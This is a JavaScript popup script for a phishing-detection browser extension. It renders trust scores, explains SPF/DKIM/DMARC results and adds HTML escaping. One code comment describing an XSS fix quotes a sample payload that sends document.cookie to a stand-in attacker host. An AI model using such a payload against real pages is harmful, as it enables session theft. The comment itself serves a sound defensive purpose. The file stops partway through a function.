const OUTCOME_COLORS = {
  SAFE_INBOX: "#1e7d4b",
  WARNING_BANNER: "#c9962c",
  QUARANTINE: "#c0392b"
};
const OUTCOME_LABELS = {
  SAFE_INBOX: "Safe Inbox",
  WARNING_BANNER: "Inbox + Warning",
  QUARANTINE: "Quarantine"
};
const CATEGORY_LABELS = { sender: "Sender", content: "Content", ai: "AI language", links: "Links", attachments: "Attachments", platform: "Platform" };
const CATEGORY_ICONS = { sender: "🪪", content: "📝", ai: "🧠", links: "🔗", attachments: "📎", platform: "🏳️" };
const AEGIS_DASHBOARD_URL = "https://argus-theta-three.vercel.app/";

// BUG FIX (round-7, security): every place below that builds HTML via a
// template string and inserts it with .innerHTML now escapes user/attacker
// -controlled text first. This popup previously inserted the raw email
// subject, link anchor text, and sender address straight into innerHTML.
// All three are attacker-controlled — an email's Subject header or a
// link's visible text is read via .textContent (which decodes entities),
// stored as-is, and was later re-inserted as literal HTML. A subject like
// `Hi <img src=x onerror=fetch('https://evil.com/x?c='+document.cookie)>`
// would execute inside this popup's page — which has chrome.storage and
// chrome.tabs access — the moment the popup opened. escapeHtml() below
// neutralizes the five characters that matter for breaking out of text
// content in HTML.
function escapeHtml(str) {
  return String(str == null ? "" : str).replace(/[&<>"']/g, ch => (
    { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[ch]
  ));
}

// ---------- Interactive detail modal ----------
// Powers the "tap a block for a better explanation" behavior on the
// Domain authentication posture chips, the AI language analysis card,
// the score-calculation rows and the risk-factor breakdown items.

const detailModalOverlay = document.getElementById("detailModalOverlay");
const detailModalBody = document.getElementById("detailModalBody");
const detailModalClose = document.getElementById("detailModalClose");

function openDetailModal(html) {
  if (!detailModalOverlay || !detailModalBody) return;
  detailModalBody.innerHTML = html;
  detailModalOverlay.classList.remove("pd-hidden");
}

function closeDetailModal() {
  detailModalOverlay?.classList.add("pd-hidden");
  if (detailModalBody) detailModalBody.innerHTML = "";
}

detailModalClose?.addEventListener("click", closeDetailModal);
detailModalOverlay?.addEventListener("click", (event) => {
  if (event.target === detailModalOverlay) closeDetailModal();
});
document.addEventListener("keydown", (event) => {
  if (event.key === "Escape") {
    closeDetailModal();
    closeChatPanel();
  }
});

function modalStatusClass(status) {
  if (["pass", "published", "quarantine", "reject"].includes(status)) return "pd-modal-status-pass";
  if (["fail"].includes(status)) return "pd-modal-status-fail";
  if (["none", "neutral", "temperror", "policy", "warn"].includes(status)) return "pd-modal-status-warn";
  return "pd-modal-status-unknown";
}

// Plain-English explanations for each authentication protocol, keyed by
// whether we're describing DNS-published posture or a provider's
// per-message verification result, then by the status value itself.
const AUTH_EXPLAINERS = {
  SPF: {
    what: "SPF (Sender Policy Framework) is a DNS record that lists which mail servers are allowed to send email for a domain. Receiving servers check the sending server's IP against this list.",
    posture: {
      published: "This domain publishes an SPF record, meaning it has explicitly listed its approved sending servers. That's a good sign of a maintained, legitimate domain — though it only proves the domain's DNS posture, not that this specific email came from an approved server.",
      fail: "No SPF record was found for this domain. Domains with no SPF record make it easier for someone to send forged mail claiming to be from that domain, since there's no published list to check against.",
      none: "SPF status could not be confirmed for this domain (monitor-only / soft state). Treat this the same as an unpublished record until it resolves.",
      unknown: "A.E.G.I.S. wasn't able to determine this domain's SPF posture during this scan."
    },
    message: {
      pass: "The mail provider confirmed this specific message was sent from a server listed in the sender domain's SPF record. This is a strong per-message signal.",
      fail: "The mail provider found this message did NOT come from a server authorized in the domain's SPF record — a notable red flag for spoofing.",
      none: "The sender domain has no SPF policy for the provider to check against.",
      neutral: "The SPF check returned a neutral result — the domain's policy explicitly doesn't assert pass or fail.",
      temperror: "A temporary error prevented the SPF check from completing for this message.",
      unknown: "Provider SPF result unavailable for this message."
    }
  },
  DKIM: {
    what: "DKIM (DomainKeys Identified Mail) attaches a cryptographic signature to outgoing mail, generated with the sending domain's private key. The receiving server verifies it with the domain's public key — proving the message wasn't altered in transit and really came from that domain's mail system.",
    posture: {
      published: "Deeper DKIM signature validation is on the A.E.G.I.S. roadmap as a header-forensics upgrade (see Roadmap). Today's scan doesn't independently verify DKIM signatures — this chip reflects general posture only, not a cryptographic check.",
      fail: "DKIM posture look-up wasn't available for this domain in the current build.",
      none: "DKIM posture look-up wasn't available for this domain in the current build.",
      unknown: "DKIM signature validation is not part of the current on-device scan — this is scoped as a future milestone (Roadmap item 02)."
    },
    message: {
      pass: "The mail provider verified this message's DKIM signature cryptographically and it checked out — strong evidence the message wasn't tampered with and really originated from this domain's mail system.",
      fail: "The mail provider's DKIM signature check FAILED for this message. This can indicate the message was altered in transit or wasn't actually sent by this domain.",
      none: "This message had no DKIM signature for the provider to verify.",
      neutral: "DKIM check returned neutral for this message.",
      temperror: "A temporary error prevented the DKIM check from completing.",
      unknown: "Provider DKIM result unavailable for this message."
    }
  },
  DMARC: {
    what: "DMARC (Domain-based Message Authentication, Reporting & Conformance) is a policy record that tells receiving servers what to do when SPF or DKIM checks fail for a domain's mail — quarantine it, reject it, or take no action.",
    posture: {
      published: "This domain publishes a DMARC policy, meaning it has told receiving mail servers what to do if a forged email claiming to be from this domain fails SPF/DKIM. That's a sign of a well-maintained domain.",
      quarantine: "This domain's DMARC policy is set to 'quarantine' — mail servers are asked to send failing messages to spam rather than the inbox.",
      reject: "This domain's DMARC policy is set to 'reject' — the strongest setting. Mail servers are asked to refuse failing messages outright.",
      fail: "No DMARC record was found for this domain. Without one, receiving servers have no instruction on what to do with mail that fails SPF/DKIM for this domain, which makes spoofing easier.",
      none: "DMARC posture could not be confirmed for this domain.",
      unknown: "A.E.G.I.S. wasn't able to determine this domain's DMARC posture during this scan."
    },
    message: {
      pass: "This message passed the sending domain's DMARC alignment check for this delivery.",
      fail: "This message FAILED DMARC alignment — SPF and/or DKIM didn't line up with the domain in the visible From address. This is one of the stronger spoofing indicators available.",
      none: "No DMARC policy applied to this message.",
      neutral: "DMARC check returned a neutral result.",
      temperror: "A temporary error prevented the DMARC check from completing.",
      unknown: "Provider DMARC result unavailable for this message."
    }
  }
};

function buildAuthModalHtml(protocol, status, kind) {
  const meta = AUTH_EXPLAINERS[protocol];
  if (!meta) return "";
  const label = (kind === "message" ? MESSAGE_AUTH_BADGE_META : AUTH_BADGE_META)[status]?.label
    || (kind === "message" ? MESSAGE_AUTH_BADGE_META.unknown.label : AUTH_BADGE_META.unknown.label);
  const explanation = (kind === "message" ? meta.message : meta.posture)[status]
    || (kind === "message" ? meta.message.unknown : meta.posture.unknown);
  return `
    <h3>🔐 ${protocol}${kind === "message" ? " — this message" : " — domain posture"}</h3>
    <span class="pd-modal-status ${modalStatusClass(status)}">${escapeHtml(label)}</span>
    <p><strong>What it checks:</strong> ${meta.what}</p>
    <p><strong>What this result means:</strong> ${explanation}</p>
    <div class="pd-modal-section-title">Why it matters</div>
    <p>${kind === "message"
      ? "Per-message results come straight from the mail provider's own delivery checks, so they're a stronger signal than DNS posture alone — but A.E.G.I.S. still treats it as one weighted signal among several, never the sole reason to quarantine a message."
      : "Domain posture tells you whether a domain is set up to make spoofing harder in general. It doesn't confirm anything about this specific email — connect Gmail or Outlook Verified Header Mode in Settings to see a per-message result too."}</p>
  `;
}

function attachAuthChipHandlers(root) {
  root.querySelectorAll(".pd-auth-chip[data-protocol]").forEach(chip => {
    chip.addEventListener("click", () => {
      openDetailModal(buildAuthModalHtml(chip.dataset.protocol, chip.dataset.status, chip.dataset.kind));
    });
  });
}

// Risk-factor / score-calculation category explainers, matched against the
// category key from result.summary or (as a fallback) keywords in the
// deduction's own label text.
const CATEGORY_EXPLAINERS = {
  sender: {
    title: "🪪 Sender identity",
    body: "This factor covers who the message claims to be from: display-name spoofing, Reply-To mismatches, lookalike/confusable characters in the domain, and how long A.E.G.I.S. has seen this sender before. Mismatches here are a strong phishing indicator because they target the exact thing people glance at first."
  },
  content: {
    title: "📝 Message content",
    body: "This factor covers language patterns inside the message itself — urgency cues, requests for credentials or payment, and other phrasing commonly seen in social-engineering attempts. It's a local, rule-based keyword/pattern check, run entirely on-device."
  },
  ai: {
    title: "🧠 AI language analysis",
    body: "A local TF-IDF + Logistic Regression model scores the message's wording for how closely it resembles known phishing language, independent of the rule-based content checks. It runs on-device and is treated as one supporting signal, not a verdict on its own."
  },
  links: {
    title: "🔗 Link reputation",
    body: "Every link's destination is checked for redirects, punycode/homoglyph tricks, and general link-reputation risk. The visible anchor text is compared against where the link actually goes — a common phishing trick is to show a trusted-looking link that points somewhere else entirely."
  },
  attachments: {
    title: "📎 Attachments",
    body: "Attachment filenames and extensions are checked for executable, script, and macro-capable file types (like .exe, .js, .docm) and for double-extension tricks (e.g. invoice.pdf.exe) — a classic way to disguise a malicious file as a harmless one."
  },
  platform: {
    title: "🏳️ Platform signal",
    body: "Gmail or Outlook's own spam classification is factored in as one minor, low-weight signal alongside everything else A.E.G.I.S. checks — never as the deciding factor on its own."
  }
};

function guessCategoryFromLabel(label) {
  const text = String(label || "").toLowerCase();
  if (/(spf|dkim|dmarc|domain age|newly[- ]registered|rdap|identity|display name|reply-to|lookalike|homoglyph|confusable)/.test(text)) return "sender";
  if (/(ai|model|logistic|phishing-language|nlp)/.test(text)) return "ai";
  if (/(link|url|redirect|punycode)/.test(text)) return "links";
  if (/(attachment|extension|\.exe|\.js|\.docm|macro)/.test(text)) return "attachments";
  if (/(spam|platform|gmail|outlook)\b/.test(text)) return "platform";
  return "content";
}

function buildCategoryModalHtml(category, label, delta) {
  const meta = CATEGORY_EXPLAINERS[category] || CATEGORY_EXPLAINERS.content;
  return `
    <h3>${meta.title}</h3>
    ${label ? `<p><strong>This finding:</strong> ${escapeHtml(label)}${typeof delta === "number" ? ` <span class="pd-score-delta">${delta > 0 ? "+" : ""}${delta} pts</span>` : ""}</p>` : ""}
    <div class="pd-modal-section-title">What this category means</div>
    <p>${meta.body}</p>
    <p class="muted small">Every deduction A.E.G.I.S. applies is named and weighted like this one — nothing is subtracted from the trust score silently.</p>
  `;
}

function buildAiModalHtml(result) {
  const ai = result.aiClassification;
  if (!ai?.available) {
    return `
      <h3>🧠 AI language analysis</h3>
      <p>The local AI model was unavailable for this scan, so this signal didn't contribute to the score. The rule-based content, link, sender and attachment checks still ran normally.</p>
    `;
  }
  const percent = typeof ai.probabilityPercent === "number" ? ai.probabilityPercent : Math.round((ai.probability || 0) * 1000) / 10;
  const terms = (ai.strongestPhishingTerms || []).slice(0, 8).map(item => `<li>${escapeHtml(item.term)}</li>`).join("");
  return `
    <h3>🧠 AI language analysis</h3>
    <span class="pd-modal-status ${percent >= 60 ? "pd-modal-status-fail" : percent >= 30 ? "pd-modal-status-warn" : "pd-modal-status-pass"}">${percent}% phishing-language · ${escapeHtml(ai.band || "unknown")} band</span>
    <p>A local TF-IDF + Logistic Regression model — trained to recognize phishing-style wording — scored this message's text. It runs entirely on-device; the message body is never uploaded anywhere for this check.</p>
    ${terms ? `<div class="pd-modal-section-title">Strongest contributing phrases</div><ul class="pd-modal-list">${terms}</ul>` : ""}
    <p class="muted small">This is a supporting linguistic signal, not proof of fraud — it feeds into the weighted score alongside sender, link and attachment evidence, and can never quarantine a message by itself.</p>
  `;
}

const contentEl = document.getElementById("content");
const scanBtn = document.getElementById("scanBtn");
const consentPanel = document.getElementById("consentPanel");
const consentEmailEl = document.getElementById("consentEmail");
const historySection = document.getElementById("historySection");
const historyList = document.getElementById("historyList");
const autoScanCheckbox = document.getElementById("autoScanCheckbox");
const autoScanListCheckbox = document.getElementById("autoScanListCheckbox");
const zoneList = document.getElementById("zoneList");
const zoneEmpty = document.getElementById("zoneEmpty");
const dangerCountEl = document.getElementById("dangerCount");
const moderateCountEl = document.getElementById("moderateCount");
const trustedSenderList = document.getElementById("trustedSenderList");
const trustedSenderEmpty = document.getElementById("trustedSenderEmpty");
const trustedMessageList = document.getElementById("trustedMessageList");
const trustedMessageEmpty = document.getElementById("trustedMessageEmpty");
const privacyActivityList = document.getElementById("privacyActivityList");
const privacyActivityEmpty = document.getElementById("privacyActivityEmpty");
const clearPrivacyLogBtn = document.getElementById("clearPrivacyLogBtn");
const gmailOAuthStatusEl = document.getElementById("gmailOAuthStatus");
const gmailOAuthDot = document.getElementById("gmailOAuthDot");
const gmailOAuthMessage = document.getElementById("gmailOAuthMessage");
const connectGmailBtn = document.getElementById("connectGmailBtn");
const disconnectGmailBtn = document.getElementById("disconnectGmailBtn");
const outlookOAuthStatusEl = document.getElementById("outlookOAuthStatus");
const outlookOAuthDot = document.getElementById("outlookOAuthDot");
const outlookOAuthMessage = document.getElementById("outlookOAuthMessage");
const connectOutlookBtn = document.getElementById("connectOutlookBtn");
const disconnectOutlookBtn = document.getElementById("disconnectOutlookBtn");

let activeTabId = null;
let activeTabUrl = "";
let currentEmail = null;
let currentSubject = "";
let currentZone = "danger";
let currentResult = null;
const ENGINE_VERSION = chrome.runtime.getManifest().version;

function sameMessageText(a, b) {
  return String(a || "").trim().toLowerCase() === String(b || "").trim().toLowerCase();
}

function diagnosticMatchesCurrentMessage(diagnostic) {
  return !!diagnostic && sameMessageText(diagnostic.email, currentEmail) &&
    sameMessageText(diagnostic.subject, currentSubject);
}

function requestManualScan(statusMessage = "Scanning…") {
  if (!activeTabId || !currentEmail) return Promise.resolve(false);
  renderEmpty(statusMessage);
  return new Promise(resolve => {
    chrome.tabs.sendMessage(
      activeTabId,
      { type: "MANUAL_SCAN", email: currentEmail, subject: currentSubject },
      async response => {
        const runtimeMessage = chrome.runtime.lastError?.message;
        if (runtimeMessage || !response?.ok) {
          renderScanFailure({
            email: currentEmail,
            subject: currentSubject,
            platform: "Gmail/Outlook Web",
            error: runtimeMessage || "The currently open message could not be matched for scanning.",
            version: ENGINE_VERSION,
            ts: Date.now()
          });
          resolve(false);
          return;
        }
        // Render the exact result returned by the forced scan. Outlook's
        // reading pane and storage notifications can race one another; using
        // the direct response prevents the popup from retaining the old score.
        if (response.result) {
          renderResult(response.result);
          await renderHistory(currentEmail);
          await renderZoneList();
        } else {
          await loadAndRenderCurrentEmail();
        }
        resolve(true);
      }
    );
  });
}

// ---------- Tab navigation ----------

document.querySelectorAll(".pd-tab").forEach(tabBtn => {
  tabBtn.addEventListener("click", () => {
    document.querySelectorAll(".pd-tab").forEach(b => b.classList.remove("pd-tab-active"));
    document.querySelectorAll(".pd-tab-panel").forEach(p => p.classList.remove("pd-tab-panel-active"));
    tabBtn.classList.add("pd-tab-active");
    document.getElementById(`tab-${tabBtn.dataset.tab}`).classList.add("pd-tab-panel-active");
    if (tabBtn.dataset.tab === "zones") renderZoneList();
  });
});

// ---------- Settings accordions (About + Privacy, moved out of their own tabs) ----------

document.querySelectorAll(".pd-accordion-head").forEach(head => {
  head.setAttribute("aria-expanded", "false");
  head.addEventListener("click", () => {
    const key = head.dataset.accordion;
    const body = document.getElementById(`accordion-body-${key}`);
    if (!body) return;
    const isOpen = !body.classList.contains("pd-hidden");
    body.classList.toggle("pd-hidden", isOpen);
    head.setAttribute("aria-expanded", String(!isOpen));
    if (!isOpen && key === "privacy") renderPrivacyActivity();
  });
});

// ---------- Light / dark theme ----------

const themeToggleBtn = document.getElementById("themeToggleBtn");
const themeToggleIcon = document.getElementById("themeToggleIcon");

function applyTheme(theme) {
  document.documentElement.setAttribute("data-theme", theme === "dark" ? "dark" : "light");
  if (themeToggleIcon) themeToggleIcon.textContent = theme === "dark" ? "☀️" : "🌙";
  if (themeToggleBtn) themeToggleBtn.title = theme === "dark" ? "Switch to light mode" : "Switch to dark mode";
}

async function initTheme() {
  const { aegisTheme } = await chrome.storage.local.get("aegisTheme");
  const preferredDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
  applyTheme(aegisTheme || (preferredDark ? "dark" : "light"));
}

themeToggleBtn?.addEventListener("click", async () => {
  const current = document.documentElement.getAttribute("data-theme") === "dark" ? "dark" : "light";
  const next = current === "dark" ? "light" : "dark";
  applyTheme(next);
  await chrome.storage.local.set({ aegisTheme: next });
});

initTheme();

document.querySelectorAll(".pd-zone-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".pd-zone-btn").forEach(b => b.classList.remove("pd-zone-btn-active"));
    btn.classList.add("pd-zone-btn-active");
    currentZone = btn.dataset.zone;
    renderZoneList();
  });
});

// ---------- Gauge (speedometer) ----------

function buildGaugeSVG(score) {
  const boundedScore = Math.max(0, Math.min(100, Number(score) || 0));
  const angle = 180 - (boundedScore / 100) * 180;
  const rad = (angle * Math.PI) / 180;
  const cx = 110, cy = 84, r = 70;
  const needleX = cx + r * Math.cos(rad);
  const needleY = cy - r * Math.sin(rad);

  return `
    <svg viewBox="0 0 220 112" role="img" aria-label="Trust score ${boundedScore} out of 100">
      <path d="M 28 82 Q 56 67 61 27" stroke="#c9362b" stroke-width="17" fill="none" stroke-linecap="round"/>
      <path d="M 72 25 Q 110 36 148 25" stroke="#d09a20" stroke-width="17" fill="none" stroke-linecap="round"/>
      <path d="M 159 27 Q 164 67 192 82" stroke="#1d8548" stroke-width="17" fill="none" stroke-linecap="round"/>
      <line x1="${cx}" y1="${cy}" x2="${needleX.toFixed(2)}" y2="${needleY.toFixed(2)}" stroke="#182a4e" stroke-width="4" stroke-linecap="round"/>
      <circle cx="${cx}" cy="${cy}" r="6" fill="#182a4e"/>
    </svg>
  `;
}

function openAegisDashboard() {
  chrome.tabs.create({ url: AEGIS_DASHBOARD_URL });
}

// ---------- Home tab rendering ----------

function renderSummaryRows(summary) {
  if (!summary) return "";
  return Object.entries(summary)
    .filter(([, items]) => items && items.length > 0)
    .map(([key, items]) => `
      <div class="pd-summary-row">
        <span class="pd-summary-label">${CATEGORY_ICONS[key] || ""} ${CATEGORY_LABELS[key] || key}</span>
        <ul class="pd-summary-items">${items.map(i => `<li data-category="${key}" data-label="${escapeHtml(i.label)}" data-delta="${typeof i.delta === "number" ? i.delta : ""}">${escapeHtml(i.label)}${typeof i.delta === "number" ? ` <strong class="pd-score-delta">${i.delta > 0 ? "+" : ""}${i.delta}</strong>` : ""}</li>`).join("")}</ul>
      </div>
    `).join("");
}

function renderStats(stats) {
  if (!stats) return "";
  const ageText = typeof stats.senderDomainAgeDays === "number"
    ? stats.senderDomainAgeDays + " days"
    : "Unknown";
  const seenText = typeof stats.senderFirstSeenDays === "number"
    ? (stats.senderFirstSeenDays === 0 ? "First time seen by A.E.G.I.S." : `${stats.senderFirstSeenDays} day(s)`)
    : "Unknown";
  return `
    <div class="pd-summary-row">
      <span class="pd-summary-label">📊 Stats</span>
      <ul class="pd-summary-items">
        <li>Links scanned: ${stats.linksScanned} · unique risky links: ${stats.riskyLinks ?? stats.linksFlagged ?? 0} · risk signals: ${stats.linkRiskSignals ?? stats.linksFlagged ?? 0}</li>
        <li>Attachments scanned: ${stats.attachmentsScanned} · flagged: ${stats.attachmentsFlagged}</li>
        <li>Sender identity mismatches: ${stats.identityMismatchCount ?? 0}</li>
        <li>Unicode lookalike characters: ${stats.unicodeConfusableCount ?? 0}</li>
        <li>Sender domain age: ${ageText}</li>
        <li>Known to A.E.G.I.S. for: ${seenText}</li>
        <li>Risk phrases matched: ${stats.contentPhraseCount}</li>
        <li>Severity: ${stats.severity}</li>
      </ul>
    </div>
  `;
}

function renderAiSection(result) {
  const ai = result.aiClassification;
  if (!ai?.available) return `
    <div class="pd-dashboard-section">
      <h2>🧠 AI language analysis</h2>
      <p>Local model unavailable for this scan. The forensic and rule-based checks still completed.</p>
    </div>`;
  const percent = typeof ai.probabilityPercent === "number" ? ai.probabilityPercent : Math.round((ai.probability || 0) * 1000) / 10;
  const terms = (ai.strongestPhishingTerms || []).slice(0, 5).map(item => escapeHtml(item.term)).join(" · ");
  return `
    <div class="pd-dashboard-section pd-ai-section-trigger" role="button" tabindex="0">
      <h2>🧠 AI language analysis <span class="pd-section-hint">Tap for detail</span></h2>
      <p><strong>${percent}% phishing-language probability</strong> · ${escapeHtml(ai.band || "unknown")} band</p>
      ${terms ? `<p>Strongest phishing-language features: ${terms}</p>` : ""}
      <small>TF-IDF + Logistic Regression, executed locally. This is a supporting linguistic signal—not proof of fraud—and cannot quarantine a message by itself.</small>
    </div>`;
}

function renderScoreCalculation(result) {
  const deductions = (result.breakdown || []).filter(item => typeof item.delta === "number" && item.delta < 0);
  const rows = deductions.map(item => `
    <li data-clickable="1" data-category="${guessCategoryFromLabel(item.label)}" data-label="${escapeHtml(item.label)}" data-delta="${item.delta}"><span>${escapeHtml(item.label)}</span><strong>${item.delta}</strong></li>
  `).join("");
  return `
    <div class="pd-dashboard-section pd-calculation-section">
      <h2>🧮 How the score was calculated <span class="pd-section-hint">Tap a line for detail</span></h2>
      <ul class="pd-calculation-list">
        <li><span>Starting trust score</span><strong>100</strong></li>
        ${rows || '<li><span>No deductions applied</span><strong>0</strong></li>'}
        <li class="pd-calculation-total"><span>Final trust score</span><strong>${result.score}</strong></li>
      </ul>
      ${result.isKnownContact ? '<p class="muted small">Trusted sender reputation was accepted, while links, message content and attachments were still checked.</p>' : ''}
    </div>
  `;
}

// ---------- Authentication badges (SPF / DKIM / DMARC) ----------

const AUTH_BADGE_META = {
  pass: { cls: "pd-auth-pass", label: "Pass" },
  fail: { cls: "pd-auth-fail", label: "Not published" },
  none: { cls: "pd-auth-warn", label: "Monitor only" },
  quarantine: { cls: "pd-auth-pass", label: "Quarantine policy" },
  reject: { cls: "pd-auth-pass", label: "Reject policy" },
  published: { cls: "pd-auth-pass", label: "Published" },
  unknown: { cls: "pd-auth-unknown", label: "Unknown" },
  unavailable: { cls: "pd-auth-unknown", label: "Not available" }
};

const MESSAGE_AUTH_BADGE_META = {
  pass: { cls: "pd-auth-pass", label: "Pass" },
  fail: { cls: "pd-auth-fail", label: "Fail" },
  none: { cls: "pd-auth-warn", label: "None" },
  neutral: { cls: "pd-auth-warn", label: "Neutral" },
  temperror: { cls: "pd-auth-warn", label: "Temporary error" },
  policy: { cls: "pd-auth-warn", label: "Policy" },
  unknown: { cls: "pd-auth-unknown", label: "Unknown" },
  unavailable: { cls: "pd-auth-unknown", label: "Not available" }
};

function authBadge(name, status) {
  const meta = AUTH_BADGE_META[status] || AUTH_BADGE_META.unknown;
  return `<button type="button" class="pd-auth-chip ${meta.cls}" data-protocol="${name}" data-status="${status || "unknown"}" data-kind="posture">
    <span class="pd-auth-name">${name}</span><span class="pd-auth-status">${meta.label}</span><span class="pd-auth-tap-hint">Tap for detail</span>
  </button>`;
}

function messageAuthBadge(name, status) {
  const meta = MESSAGE_AUTH_BADGE_META[status] || MESSAGE_AUTH_BADGE_META.unknown;
  return `<button type="button" class="pd-auth-chip ${meta.cls}" data-protocol="${name}" data-status="${status || "unknown"}" data-kind="message">
    <span class="pd-auth-name">${name}</span><span class="pd-auth-status">${meta.label}</span><span class="pd-auth-tap-hint">Tap for detail</span>
  </button>`;
}

function renderAuthSection(stats) {
  if (!stats) return "";
  return `
    <div class="pd-dashboard-section">
      <h2>🔐 Domain authentication posture <span class="pd-section-hint">Tap SPF / DKIM / DMARC</span></h2>
      <div class="pd-auth-row">
        ${authBadge("SPF", stats.spfStatus)}
        ${authBadge("DKIM", stats.dkimStatus)}
        ${authBadge("DMARC", stats.dmarcStatus)}
      </div>
      <p class="muted small pd-auth-note">“Published” means the sender domain advertises an SPF/DMARC policy. This is DNS posture, not proof that this particular email passed.</p>
    </div>
  `;
}

function renderMessageAuthSection(result) {
  const auth = result?.messageAuthentication;
  const stats = result?.stats || {};
  const provider = auth?.provider || stats.messageAuthProvider || "Mail provider";
  if (!auth) return "";
  if (!auth.available) {
    return `
      <div class="pd-dashboard-section pd-provider-auth-unavailable">
        <h2>🧾 ${escapeHtml(provider)} Verified Header Mode</h2>
        <p class="muted small pd-auth-note">Provider authentication results were unavailable for this scan. ${escapeHtml(auth.reason || `Reconnect ${provider} or open a fully loaded message and rescan.`)}</p>
      </div>
    `;
  }
  return `
    <div class="pd-dashboard-section pd-provider-auth">
      <h2>🧾 This message — ${escapeHtml(provider)} provider results <span class="pd-section-hint">Tap for detail</span></h2>
      <div class="pd-auth-row">
        ${messageAuthBadge("SPF", stats.messageSpfStatus)}
        ${messageAuthBadge("DKIM", stats.messageDkimStatus)}
        ${messageAuthBadge("DMARC", stats.messageDmarcStatus)}
      </div>
      <p class="muted small pd-auth-note">Reported by ${escapeHtml(stats.messageAuthSource || provider)} from selected metadata headers. A.E.G.I.S. stores only this result summary, not the original header or email body. This is provider verification, not independent DKIM cryptography.</p>
    </div>
  `;
}

// ---------- Attachment analysis ----------

function renderAttachmentsSection(result) {
  const atts = result.attachments;
  if (!atts || atts.length === 0) return "";
  return `
    <div class="pd-dashboard-section">
      <h2>📎 Attachments (${atts.length})</h2>
      <ul class="breakdown">
        ${atts.slice(0, 10).map(a => `<li>${escapeHtml(a.name || "")}</li>`).join("")}
      </ul>
    </div>
  `;
}

function renderResult(result) {
  currentResult = result;
  const color = OUTCOME_COLORS[result.outcome] || "#8a93a3";
  const label = OUTCOME_LABELS[result.outcome] || result.outcome;
  const v = result.verdict || {};
  const stats = result.stats || {};
  const coverage = result.scanCoverage || {
    mode: result.senderAddressUnavailable ? "partial" : "full",
    completed: result.senderAddressUnavailable ? ["Message content", "Links", "Attachment filenames"] : ["Sender", "Domain posture", "Content", "Links", "Attachments"],
    unavailable: result.senderAddressUnavailable ? ["Sender identity", "Domain posture", "Domain age"] : []
  };
  const coverageLabel = coverage.mode === "partial" ? "Partial scan" : coverage.mode === "trusted" ? "Trusted-sender scan" : coverage.mode === "trusted-message" ? "Trusted-message scan" : coverage.mode === "verified" ? "Verified Outlook scan" : "Full scan";

  const linksHtml = (result.links && result.links.length)
    ? `<div class="pd-dashboard-section pd-links-section">
        <h2>🔗 Link reputation &amp; destination check (${result.links.length})</h2>
        <ul class="breakdown">
          ${result.links.slice(0, 8).map(l => {
            let host = l.href || l;
            try { host = new URL(l.href || l).hostname; } catch (e) {}
            const textPart = l.text ? ` — anchor text: "${escapeHtml(l.text.slice(0, 30))}"` : "";
            return `<li><span class="pd-link-host">${escapeHtml(host)}</span>${textPart}</li>`;
          }).join("")}
        </ul>
      </div>`
    : "";

  contentEl.innerHTML = `
    <div class="sender">${escapeHtml(result.senderLabel || result.email)}</div>
    ${result.senderAddressUnavailable ? '<p class="pd-partial-scan-note">Partial scan: Outlook hid the sender address in this view, so domain checks were unavailable.</p>' : ''}
    <div class="pd-coverage-card ${coverage.mode === "partial" ? "pd-coverage-partial" : ""}">
      <strong>${coverageLabel}</strong>
      <span>${coverage.completed.length} checks completed${coverage.unavailable.length ? ` · ${coverage.unavailable.length} unavailable` : ""}</span>
      <span>${typeof result.scanDurationMs === "number" ? `Completed in ${result.scanDurationMs} ms` : "Duration unavailable"}</span>
      <small>Checked: ${coverage.completed.map(escapeHtml).join(" · ")}</small>
      ${coverage.unavailable.length ? `<small>Unavailable: ${coverage.unavailable.map(escapeHtml).join(" · ")}</small>` : ""}
    </div>
    <div class="pd-gauge-wrap">
      ${buildGaugeSVG(result.score)}
      <div class="pd-gauge-score" style="color:${color}">${result.score}</div>
      <div class="pd-gauge-label" style="color:${color}">${label}</div>
    </div>
    <div class="pd-verdict-box" style="border-color:${color}">
      <span class="pd-verdict-icon">${v.icon || ""}</span>
      <span><strong>${v.title || ""}</strong> — ${v.message || ""}</span>
    </div>
    ${renderAuthSection(stats)}
    ${renderMessageAuthSection(result)}
    ${renderAiSection(result)}
    ${renderScoreCalculation(result)}
    <div class="pd-dashboard-section">
      <h2>🕵️ Risk factor breakdown <span class="pd-section-hint">Tap a finding for detail</span></h2>
      <div class="pd-summary-rows">${renderSummaryRows(result.summary)}${renderStats(stats)}</div>
    </div>
    ${linksHtml}
    ${renderAttachmentsSection(result)}
    <div class="pd-result-actions">
      ${(result.isKnownContact || result.isTrustedMessage) ? `<button id="removeCurrentTrustBtn" class="pd-btn" type="button">${result.isTrustedMessage ? "Remove message trust" : "Remove trust"}</button>` : ''}
      <button id="exportPdfReportBtn" class="pd-btn pd-btn-primary" type="button">Export PDF report</button>
      <button id="exportJsonReportBtn" class="pd-btn" type="button">Export JSON</button>
    </div>
  `;
  document.getElementById("removeCurrentTrustBtn")?.addEventListener("click", () =>
    removeTrust(result.email, true, !!result.isTrustedMessage, result.subject, result.scanCacheKeyEmail)
  );
  document.getElementById("exportPdfReportBtn")?.addEventListener("click", () => exportPdfScanReport(result));
  document.getElementById("exportJsonReportBtn")?.addEventListener("click", () => exportScanReport(result));
  scanBtn.textContent = "Rescan this email";

  // ---- Make the score/risk sections interactive: wire up click handlers
  // now that the fresh markup for this scan is in the DOM. ----
  attachAuthChipHandlers(contentEl);

  const aiTrigger = contentEl.querySelector(".pd-ai-section-trigger");
  aiTrigger?.addEventListener("click", () => openDetailModal(buildAiModalHtml(result)));
  aiTrigger?.addEventListener("keydown", (event) => {
    if (event.key === "Enter" || event.key === " ") {
      event.preventDefault();
      openDetailModal(buildAiModalHtml(result));
    }
  });

  contentEl.querySelectorAll(".pd-calculation-list li[data-clickable=\"1\"]").forEach(row => {
    row.addEventListener("click", () => {
      const delta = row.dataset.delta === "" ? undefined : Number(row.dataset.delta);
      openDetailModal(buildCategoryModalHtml(row.dataset.category, row.dataset.label, delta));
    });
  });

  contentEl.querySelectorAll(".pd-summary-items li[data-category]").forEach(row => {
    row.addEventListener("click", () => {
      const delta = row.dataset.delta === "" ? undefined : Number(row.dataset.delta);
      openDetailModal(buildCategoryModalHtml(row.dataset.category, row.dataset.label, delta));
    });
  });
}

function getTrustedMessageKey(email, subject) {
  return `${String(email || "").trim().toLowerCase()}|${String(subject || "").trim().toLowerCase()}`;
}

async function removeTrust(email, rescanCurrent = false, isTrustedMessage = false, subject = "", scanCacheKeyEmail = "") {
